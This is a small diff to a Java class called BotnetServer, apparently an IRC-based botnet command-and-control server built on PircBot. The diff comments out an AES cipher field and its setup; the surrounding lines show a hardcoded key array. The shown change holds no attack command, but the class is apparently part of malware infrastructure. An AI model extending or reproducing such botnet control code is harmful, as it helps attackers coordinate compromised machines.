@@ -74,7 +74,7 @@ public class BotnetServer extends PircBot {
 	(byte)0x65, (byte)0xa1, (byte)0xd0, (byte)0x01};
 
 	private Key masterKey;
-	private Cipher masterCipher;
+	//private Cipher masterCipher;
 	
 	private MsgEncrypt masterMsgE;
 	
@@ -100,8 +100,8 @@ public class BotnetServer extends PircBot {
 			
 			botInfo = new HashMap<String, Key>();
 			masterKey = new SecretKeySpec(key, "AES");
-			masterCipher = Cipher.getInstance("AES");
-			masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
+			//masterCipher = Cipher.getInstance("AES");
+			//masterCipher.init(Cipher.ENCRYPT_MODE, masterKey);
 			masterMsgE = MsgEncrypt.getInstance(masterKey);
 		} catch (NickAlreadyInUseException e) {
 			changeNick(NAME);
